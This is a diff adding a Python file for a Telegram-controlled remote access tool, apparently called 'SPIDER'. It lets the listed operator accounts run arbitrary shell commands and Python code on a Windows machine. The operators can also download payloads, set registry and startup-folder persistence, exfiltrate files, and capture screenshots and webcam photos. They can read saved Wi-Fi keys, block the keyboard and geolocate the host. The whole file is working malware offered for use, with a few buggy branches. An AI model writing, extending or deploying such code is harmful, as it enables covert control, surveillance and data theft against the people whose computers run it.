@@ -1,0 +1,483 @@
+isAccess = False
+corect_id = [1205857033,2059209867]
+end = ""
+search_sys = "https://www.google.com/search?q="
+os.system('chcp 65001')
+def check_internet_connection():
+    try:
+        response = requests.get('https://api.ipify.org')
+        return True
+    except requests.ConnectionError:
+        return False
+    except telebot.apihelper.ApiTelegramException:
+        pass
+if check_internet_connection():
+    def sravn(who):
+        global isAccess
+        for a in corect_id:
+            if a == who:
+                return True
+                print(1243)
+            return False
+@bot.message_handler(func=lambda m: True,content_types=["text"])
+def echo_all(message):
+    global end,file_otpr,file_otpr_dir,search_sys
+    try:
+        end = ""
+        basic_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        basic_keyboard4 = types.KeyboardButton(text="CHECK CONNECTION")
+        basic_keyboard1 = types.KeyboardButton(text="CHECK INFO")
+        basic_keyboard2 = types.KeyboardButton(text="USER INFO")
+        basic_keyboard3 = types.KeyboardButton(text="CLOSE APP")
+        basic_keyboard.add(basic_keyboard1, basic_keyboard2, basic_keyboard3, basic_keyboard4)
+
+        arrows_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        arrows_key1 = types.KeyboardButton(text="ㅤ")
+        arrows_key2 = types.KeyboardButton(text="hotkey up")
+        arrows_key4 = types.KeyboardButton(text="hotkey left")
+        arrows_key5 = types.KeyboardButton(text="hotkey down")
+        arrows_key6 = types.KeyboardButton(text="hotkey right")
+        arrows_keyboard.add(arrows_key1, arrows_key2, arrows_key1)
+        arrows_keyboard.add(arrows_key4, arrows_key5, arrows_key6)
+
+        wasd_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        wasd_key1 = types.KeyboardButton(text="ㅤ")
+        wasd_key2 = types.KeyboardButton(text="hotkey w")
+        wasd_key4 = types.KeyboardButton(text="hotkey a")
+        wasd_key5 = types.KeyboardButton(text="hotkey s")
+        wasd_key6 = types.KeyboardButton(text="hotkey d")
+        wasd_keyboard.add(wasd_key1, wasd_key2, wasd_key1)
+        wasd_keyboard.add(wasd_key4, wasd_key5, wasd_key6)
+
+        mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        mouse_keyboard1 = types.KeyboardButton(text="lclick 1")
+        mouse_keyboard2 = types.KeyboardButton(text="wheel 3")
+        mouse_keyboard3 = types.KeyboardButton(text="wheel -3")
+        mouse_keyboard4 = types.KeyboardButton(text="rclick 1")
+        mouse_keyboard5 = types.KeyboardButton(text="ㅤ")
+        mouse_keyboard6 = types.KeyboardButton(text="mclick 1")
+        mouse_keyboard.add(mouse_keyboard5,mouse_keyboard2,mouse_keyboard5)
+        mouse_keyboard.add(mouse_keyboard1 ,mouse_keyboard6, mouse_keyboard4)
+        mouse_keyboard.add(mouse_keyboard5, mouse_keyboard3, mouse_keyboard5)
+
+        num_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        num_keyboard0 = types.KeyboardButton(text="hotkey 0")
+        num_keyboard1 = types.KeyboardButton(text="hotkey 1")
+        num_keyboard2 = types.KeyboardButton(text="hotkey 2")
+        num_keyboard3 = types.KeyboardButton(text="hotkey 3")
+        num_keyboard4 = types.KeyboardButton(text="hotkey 4")
+        num_keyboard5 = types.KeyboardButton(text="hotkey 5")
+        num_keyboard6 = types.KeyboardButton(text="hotkey 6")
+        num_keyboard7 = types.KeyboardButton(text="hotkey 7")
+        num_keyboard8 = types.KeyboardButton(text="hotkey 8")
+        num_keyboard9 = types.KeyboardButton(text="hotkey 9")
+        num_keyboard10 = types.KeyboardButton(text="ㅤ")
+        num_keyboard11 = types.KeyboardButton(text="hotkey backspace")
+        num_keyboard.add(num_keyboard1, num_keyboard2, num_keyboard3)
+        num_keyboard.add(num_keyboard4, num_keyboard5, num_keyboard6)
+        num_keyboard.add(num_keyboard7, num_keyboard8, num_keyboard9)
+        num_keyboard.add(num_keyboard10, num_keyboard0, num_keyboard11)
+
+        help_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        help_keyboard0 = types.KeyboardButton(text="help_wifi_key")
+        help_keyboard1 = types.KeyboardButton(text="help_move_files")
+        help_keyboard2 = types.KeyboardButton(text="help_dwf_uwf")
+        help_keyboard3 = types.KeyboardButton(text="help_startup")
+        help_keyboard.add(help_keyboard0)
+        help_keyboard.add(help_keyboard1)
+        help_keyboard.add(help_keyboard2)
+        help_keyboard.add(help_keyboard3)
+
+        tele_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        tele_keyboard0 = types.KeyboardButton(text="s2hot")
+        tele_keyboard1 = types.KeyboardButton(text="s2mou")
+        tele_keyboard2 = types.KeyboardButton(text="photo")
+        tele_keyboard.add(tele_keyboard0,tele_keyboard1,tele_keyboard2)
+
+        ibut_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        ibut_keyboard0 = types.KeyboardButton(text="hotkey del")
+        ibut_keyboard1 = types.KeyboardButton(text="hotkey backspace")
+        ibut_keyboard2 = types.KeyboardButton(text="hotkey alt+f4")
+        ibut_keyboard3 = types.KeyboardButton(text="hotkey space")
+        ibut_keyboard4 = types.KeyboardButton(text="hotkey esc")
+        ibut_keyboard.add(ibut_keyboard0,ibut_keyboard1,ibut_keyboard2)
+        ibut_keyboard.add(ibut_keyboard3,ibut_keyboard4)
+
+        b = message.text
+        print(b)
+        print(file_otpr)
+        if sravn(message.from_user.id) == True:
+            if "help_"in b:
+                path = b.split("help_")[1]
+                if path=="wifi_key":
+                    endV2 = 'How to find out the Wi\-Fi key?\n\n1\. LIST OF SAVED NETWORKS ``` netsh wlan show profiles ``` \n2\. VIEW KEY ``` netsh wlan show profile name="<SSID_NAME>" key=clear ```'
+                elif path=="move_files":
+                    endV2 = ("How to move a files?\n\n1\.MOVE FILE``` C:/Your_dir/file\.exe to C:/Another_dir ```\n\n2\. MOVE AND RENAME FILE``` C:/Your_dir/name\.exe to C:/Another_dir/another_name\.exe ```")
+                elif path=="dwf_uwf":
+                    endV2 = "How to upload a file?\n\n1\. DWF``` dwf <https://example\.png>, <C:/Your_dir/file\.png> ```\n\n2\. UWF\n\n    1\. WRITE DIR\+NAME``` uwf C:/Your_dir/file\.png ```\n\n    2\. SEND FILE``` photo or video how file, without compress ```\n\nIMPORTANT: Link in *dwf* must be raw\!"
+                elif path=="startup":
+                    endV2 = "How to put a file in startup?\n\n 1\. MOVE FILE IN STARUP FOLDER\nALL PATHS IN``` CHECK INFO ```\n\n2\. PUT IN REGISTRY EDITOR ``` regcr <PATH_IN_RE>,<FILE_NAME>,<FILE_DIR> ```\n\n<PATH_IN_RE\> YOU CAN FOUND IN:``` CHECK INFO ```"
+                bot.send_message(message.chat.id, endV2, parse_mode='MarkdownV2')
+            elif "tele"==b:
+                bot.send_message(message.chat.id, "TELE MODE", reply_markup=tele_keyboard)
+            elif "ibut"==b:
+                bot.send_message(message.chat.id, "IBUT MODE", reply_markup=ibut_keyboard)
+            elif "help"==b:
+                bot.send_message(message.chat.id, "HELP MODE", reply_markup=help_keyboard)
+            elif "basic" == b:
+                bot.send_message(message.chat.id, "BASIC MODE", reply_markup=basic_keyboard)
+            elif "arrows" == b:
+                bot.send_message(message.chat.id, "ARROWS MODE", reply_markup=arrows_keyboard)
+            elif "wasd" == b:
+                bot.send_message(message.chat.id, "WASD MODE", reply_markup=wasd_keyboard)
+            elif "mouse" == b:
+                bot.send_message(message.chat.id, "MOUSE MODE", reply_markup=mouse_keyboard)
+            elif "num" == b:
+                bot.send_message(message.chat.id, "NUMBERS MODE", reply_markup=num_keyboard)
+            elif "cmd " in b:
+                bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("cmd")[1][1:] + " ```",parse_mode="Markdown")
+                end = os.popen(b.split("cmd")[1][1:]).read()
+            elif "py " in b:
+                bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("py")[1][1:] + " ```",parse_mode="Markdown")
+                exec(b.split("py")[1][1:])
+            elif "CHECK CONNECTION" == b or "/check" == b:
+                mac = ":".join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(5, -1, -1)])
+                end = f"Hello {message.from_user.username}, your device is {mac}\!"
+
+            elif "regdir"in b:
+                def get_run_keys():
+                    try:
+                        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,b.split("regdir")[1][1:])
+                        run_keys = {}
+                        i = 0
+                        while True:
+                            try:
+                                name, value, _ = winreg.EnumValue(registry_key, i)
+                                run_keys[name] = value
+                                i += 1
+                            except OSError:
+                                # Если мы достигли конца списка, завершаем цикл
+                                break
+                        return run_keys
+                    except Exception as e:pass
+                    finally:
+                        if 'registry_key' in locals():
+                            winreg.CloseKey(registry_key)
+
+                run_registry_keys = get_run_keys()
+                s=0
+                if run_registry_keys:
+                    for name, value in run_registry_keys.items():
+                        s+=1
+                        if len(run_registry_keys)==s:
+                            end += "└──" + b.split("regdir")[1][1:]+"\\" + str(name) + ", LOCATING: " + str(value) + "\n"
+                        else:
+                            end+="├──"+b.split("regdir")[1][1:]+"/"+str(name)+", LOCATING: "+str(value)+"\n"
+                end = b.split("regdir")[1][1:]+"\n"+end
+            elif "regdic"in b:
+                def get_run_keys():
+                    try:
+                        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,b.split("regdic")[1][1:])
+                        run_keys = {}
+                        i = 0
+                        while True:
+                            try:
+                                name, value, _ = winreg.EnumValue(registry_key, i)
+                                run_keys[name] = value
+                                i += 1
+                            except OSError:
+                                # Если мы достигли конца списка, завершаем цикл
+                                break
+                        return run_keys
+                    except Exception as e:pass
+                    finally:
+                        if 'registry_key' in locals():
+                            winreg.CloseKey(registry_key)
+
+                run_registry_keys = get_run_keys()
+                s=0
+                print(235234)
+                if run_registry_keys:
+                    for name, value in run_registry_keys.items():
+                        s+=1
+                        if len(run_registry_keys)==s:
+                            end += "└──`" + b.split("regdic")[1][1:]+"\\" + str(name) + "`, LOCATING: `" + str(value) + "`\n"
+                        else:
+                            end+="├──`"+b.split("regdic")[1][1:]+"/"+str(name)+"`, LOCATING: `"+str(value)+"`\n"
+                end = b.split("regdic")[1][1:]+"\n"+end
+            elif "dic"in b:
+                    a=b.split("dic")[1][1:]
+                    x = ""
+                    s = 0
+                    for file in os.listdir(a.replace(r"\\\\",r"\\")):
+                        s+=1
+                        if len(os.listdir(a.replace(r"\\\\",r"\\")))==s:
+                            x = x + "└──`" + os.path.join(a, file) + "`\n"
+                        else:
+                            x=x+"├──`"+os.path.join(a, file)+"`\n"
+                    x=a+"\n"+x
+                    end = x.replace("/","\\")
+            elif "dir"in b:
+                    print(234)
+                    a=b.split("dir")[1][1:]
+                    x = ""
+                    s = 0
+                    for file in os.listdir(a.replace(r"\\\\",r"\\")):
+                        s+=1
+                        if len(os.listdir(a.replace(r"\\\\",r"\\")))==s:
+                            x = x + "└──" + os.path.join(a, file) + "\n"
+                        else:
+                            x=x+"├──"+os.path.join(a, file)+"\n"
+                    x=a+"\n"+x
+                    end = x.replace("/","\\")
+
+            elif "move"in b:
+                a = b.split("move")[1][1:]
+                olf = a.split("to")[0].replace(" to ", "").strip()
+                new = a.replace(olf, "").replace("to", "").strip()
+                print(olf)
+                print(new)
+                shutil.move(olf, new)
+                end = "|SPIDER| - MOVE FILES\nMOVE `"+olf+"` TO `"+new+"`"
+            elif "regcr"in b:
+                def write_registry_value(key_path, value_name, value):
+                    try:
+                        # Открываем ключ реестра с правами записи
+                        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                        # Записываем значение
+                        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, value)
+                        winreg.CloseKey(registry_key)
+                    except WindowsError as e:pass
+                key_path = b.split("regcr")[1][1:].split(",")[0]
+                value_name = b.split("regcr")[1][1:].split(",")[1]
+                value = b.split("regcr")[1][1:].split(",")[2]
+                write_registry_value(key_path, value_name, value)
+                end = "|SPIDER| - CREATE FILE IN REGISTRY EDITOR\n`"+b.split("regcr")[1][1:].split(",")[0]+"`\n`"+b.split("regcr")[1][1:].split(",")[1]+"`\n`"+b.split("regcr")[1][1:].split(",")[2]+"`\n"
+                print(end)
+            elif "regdel"in b:
+                def delete_registry_value(path, value_name):
+                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
+                        winreg.DeleteValue(key, value_name)
+                        winreg.CloseKey(key)
+                delete_registry_value(b.split("regdel")[1][1:].split(",")[0], b.split("regdel")[1][1:].split(",")[1])
+                end = "|SPIDER| - REGISTRY EDITOR DELETE FILE\n`"+b.split("regdel")[1][1:].split(",")[0]+"\n"+ b.split("regdel")[1][1:].split(",")[1]+"`"
+            elif "dwf" in b:
+                name = b.split(",")[1].strip()
+                url = b.replace("dwf","",1).replace(name,'').replace(",","").strip()
+                r = requests.get(url=url, stream=True)
+                with open(name, "wb") as file:
+                    for chunk in r.iter_content(chunk_size=1024 * 1024):
+                        if chunk:file.write(chunk)
+                end = f'THE "{name}" FILE WAS SUCCESSFULLY DOWNLOADED! METHOD: DWF'
+            elif "uwf" in b:
+
+                file_otpr_dir = b.split("uwf")[1][1:]
+                file_otpr=True
+                end = f'SEND YOUR FILE BELLOW, FILE WILL SAVED TO {file_otpr_dir}↓'
+
+
+            elif b==None and file_otpr:
+                print(1231)
+                print(message.document.file_id)
+                print(message.document.file_name)
+                file_info = bot.get_file(message.document.file_id)
+                downloaded_file = bot.download_file(file_info.file_path)
+
+                with open(os.path.join(file_otpr_dir, message.document.file_name), 'wb') as new_file:
+                    new_file.write(downloaded_file)
+                file_otpr_dir=""
+                file_otpr=False
+                end = "Fasdfasdf"
+            elif "open" in b:
+                os.startfile(b.split("open")[1][1:])
+                end = "OPEN -\n"+b.split("open")[1][1:]
+            elif "s2hot"==b:
+                screenshot = ImageGrab.grab()
+                img_byte_arr = io.BytesIO()
+                screenshot.save(img_byte_arr, format='PNG')
+                img_byte_arr.seek(0)
+                end = "YOUR SCREENSHOT ↑"
+                bot.send_photo(message.chat.id, img_byte_arr)
+            elif "s2mou" in b:
+                mouse_x, mouse_y = mouse.get_position()
+                screenshot = ImageGrab.grab()
+                draw = ImageDraw.Draw(screenshot)
+                cursor_size = 15
+                draw.line([(mouse_x - cursor_size, mouse_y), (mouse_x + cursor_size, mouse_y)], fill='red', width=3)
+                draw.line([(mouse_x, mouse_y - cursor_size), (mouse_x, mouse_y + cursor_size)], fill='red', width=4)
+                img_byte_arr = io.BytesIO()
+                screenshot.save(img_byte_arr, format='PNG')
+                img_byte_arr.seek(0)
+                end = "YOUR SCREENSHOT WITH CURSOR↑"
+                bot.send_photo(message.chat.id, img_byte_arr)
+            elif "photo"==b:
+                cap = cv2.VideoCapture(0)
+                for i in range(30):
+                    cap.read()
+                ret, frame = cap.read()
+                cap.release()
+                _, buffer = cv2.imencode('.jpg', frame)
+                ima_b = buffer.tobytes()
+                photo = io.BytesIO(ima_b)
+                photo.seek(0)
+                bot.send_photo(message.chat.id, photo)
+                end = "YOUR PHOTO ↑"
+            elif "sef"in b:
+                a = b.split("sef")[1][1:]
+                with open(a, 'rb') as f:
+                    bot.send_document(message.chat.id, f)
+            elif "hotkey" in b:
+                keyboard.send(b.split("hotkey")[1][1:])
+                end = "|SPIDER| - BUTTON PRESSING\n" + b.split("hotkey")[1][1:]
+            elif "write" in b:
+                kb.write(b.split("write")[1][1:])
+                end="|SPIDER| - WRITING TEXT\n"+b.split("write")[1][1:]
+            elif "lclick" in b:
+                [mouse.click("left") for _ in range(int(b.split("lclick")[1][1:]))]
+            elif "rclick" in b:
+                [mouse.click("right") for _ in range(int(b.split("rclick")[1][1:]))]
+            elif "mclick" in b:
+                [mouse.click("middle") for _ in range(int(b.split("mclick")[1][1:]))]
+            elif "wheel" in b:
+                mouse.wheel(int(b.split("wheel")[1][1:]))
+            elif "flash" in b:
+                root = Tk()
+                root.attributes("-topmost",True)
+                root.overrideredirect(1)
+                root.geometry(f'{root.winfo_screenwidth()}x{root.winfo_screenheight()}')
+                root.update()
+
+                if b.split("flash")[1][1:]:
+                    root.after(b.split("flash")[1][1:], root.destroy)
+                    end = f"FLASHED FOR {b.split('flash')[1][1:]}mc"
+                else:
+                    root.after(150, root.destroy)
+                    end = f"FLASHED FOR 150mc"
+                root.mainloop()
+            elif "unblock" in b:
+                keyboard.unblock_key(b.split('unblock')[1][1:])
+                end = "|SPIDER| - UNBLOCK BUTTON\n"+b.split('unblock')[1][1:]
+
+                keyboard.block_key(b.split('block')[1][1:])
+                end = "|SPIDER| - BLOCK BUTTON\n"+b.split('block')[1][1:]
+            elif "unbal"==b:
+                keyboard.unhook_all()
+                end = "|SPIDER| - UNLOCK ALL KEYS"
+            elif "bal"==b:
+                all_keys = [
+                    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
+                    'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
+                    'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
+                    'enter', 'space', 'esc', 'tab', 'shift', 'ctrl', 'alt',"win","alt",
+                    "f1","f2","f3","f4","f5","f6","f7","f8",'f9',"f10","f11","f12"]
+                for i in all_keys:
+                    keyboard.block_key(i)
+                end = "|SPIDER| - BLOCK ALL KEYS"
+            elif "browser" in b:
+                webbrowser.open_new_tab(search_sys+b.split('browser')[1][1:])
+                end = "|SPIDER| - OPEN REQUEST IN BROWSER\nURL:"+search_sys+b.split('browser')[1][1:].replace(" ","%20")+"\nREQUEST:"+ b.split('browser')[1][1:]
+            elif "search_sys"in b:
+                search_sys=b.split('search_sys')[1][1:]
+                end = "|SPIDER| - NEW SEARCH SYSTEM\n"+b.split('search_sys')[1][1:]+"\n"+"-"*50+"\n"+"\n|YANDEX SYS| - ``` https://yandex.ru/search/?text= ```\n|GOOGLE SYS| - ``` https://www.google.com/search?q= ```"
+            elif "url" in b:
+                webbrowser.open_new_tab(b.split('url')[1][1:])
+                end = "|SPIDER| - OPEN URL IN BROWSER\nURL:"+b.split('url')[1][1:]
+            elif "CLOSE APP" == b:
+                global sent_message
+                markup = types.InlineKeyboardMarkup()
+                button0 = types.InlineKeyboardButton("No", callback_data=f"WORK")
+                button1 = types.InlineKeyboardButton("Yes", callback_data=f"ENERGY_OFF")
+                markup.add(button0)
+                markup.add(button1)
+                sent_message = bot.send_message(message.chat.id, "You really want do it?", reply_markup=markup)
+            elif "CHECK INFO"==b:
+                data_geoip = requests.get("https://ipinfo.io/" + requests.get("https://api.ipify.org/?format=json").json()["ip"] + "/json").json()
+                end = (
+                        "HOSTNAME CONFIRMED:" + " *" + socket.gethostname() + "*\n" +
+                        "├──MOUSE POS: `" + str(mouse.get_position()) + "`\n"+
+                        "├──IN IP:" + " `" + socket.gethostbyname(socket.gethostname()) + "`\n" +
+                        "├──EX IP: `" + requests.get("https://ipinfo.io/" + requests.get("https://api.ipify.org/?format=json").json()["ip"] + "/json").json()['ip'] + "`\n" +
+                        "├──MAC:" + " `" + ":".join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(5, -1, -1)]) + "`\n" +
+                        "├──SIZE: `" + str(GetSystemMetrics(0)) + "x" + str(GetSystemMetrics(1)) + "`\n" +
+                        "└──SYS: `" + platform.uname().system + " " + platform.uname().release + " " + "(" + platform.uname().version + ")" + "`\n\n" +
+                        "INFO ABOUT * `" + data_geoip["ip"] + "` * IP:" + "\n"
+                        "├──HOSTNAME: `" + data_geoip["hostname"] + "`\n"
+                        "├──CITY: `" +data_geoip["city"] + "`\n"
+                        "├──RG: `" + data_geoip["region"] + "`\n"
+                        "├──LOC PR: `" + data_geoip["loc"] + "`\n"
+                        "├──ORG: `" + data_geoip["org"] + "`\n"
+                        "└──TZ: `" + data_geoip["timezone"]+"`\n\n"+
+                        "REGISTRY EDITOR STARTUP:``` Software\Microsoft\Windows\CurrentVersion\Run ```"
+                        "FILE LOCATING IN: ``` " + str(*sys.argv) + " ```\n"+
+                        "STARTUP FOLDER: ``` C:\\Users\\"+getpass.getuser()+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup ```")
+            elif "USER INFO" == b:
+                endV2 = (f"ID: ||{message.from_user.id}||\n"
+                         f"IS\_BOT: ||{message.from_user.is_bot}||\n"
+                         f"F\_N: ||{message.from_user.first_name}||\n"
+                         f"U\_N: ||@{message.from_user.username}||\n"
+                         f"L\_N: ||{message.from_user.last_name}||\n"
+                         f"LCODE: ||{message.from_user.language_code}||\n"
+                         f"PREMIUM: ||{message.from_user.is_premium}||\n\n")
+                bot.send_message(message.chat.id, endV2, parse_mode='MarkdownV2')
+
+            if len(end)>0:
+                print(23)
+                if len(end)<=4096:
+                    bot.send_message(message.chat.id, end, parse_mode='Markdown')
+
+                else:
+                    end = end.replace('`',"")
+                    file_stream = io.BytesIO()
+                    file_stream.write(end.encode('utf-8'))  # Записываем текст в файл
+                    file_stream.seek(0)  # Перемещаем указатель в начало файла
+
+                    # Отправляем файл
+                    bot.send_document(message.chat.id, file_stream, caption='THE ANSWER IS TO LONG',visible_file_name="text.txt")
+            else:
+                print(78)
+
+    except Exception as b:
+        bot.send_message(message.chat.id, str(b))
+    except telebot.apihelper.ApiTelegramException:
+        pass
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    global sent_message,stop
+    bot.delete_message(sent_message.chat.id, sent_message.message_id)
+    if call.data == f'ENERGY_OFF':
+        bot.answer_callback_query(call.id, "APP CLOSED")
+        bot.send_message(sent_message.chat.id, "PREPARE A MESSAGE FOR THE FUTURE AND CLOSE!")
+        stop=True
+        exit_bot()
+        bot.stop_bot()
+        sys.exit()
+
+
+@bot.message_handler(content_types=['audio', 'voice','document',"photo"])
+def handle_document(message):
+    try:
+        global file_otpr,file_otpr_dir
+        print(1)
+        try:
+            file_info = bot.get_file(message.document.file_id)
+        except AttributeError:
+            file_info = bot.get_file(message.photo)
+        downloaded_file = bot.download_file(file_info.file_path)
+
+        # Укажите каталог, в который хотите сохранить файл
+
+        with open(file_otpr_dir, 'wb') as new_file:
+            new_file.write(downloaded_file)
+
+        bot.reply_to(message, f"FILE {message.document.file_name} SAVED AND LOCATING IN: {file_otpr_dir}")
+        with open(file_otpr_dir, 'rb') as f:
+            bot.send_document(message.chat.id, f)
+        file_otpr=False
+        file_otpr_dir=""
+
+    except Exception as b:
+        bot.reply_to(message, f"ERROR: {b}")
+
+def exit_bot():
+    if stop==False:bot.polling(none_stop=True)
+exit_bot()
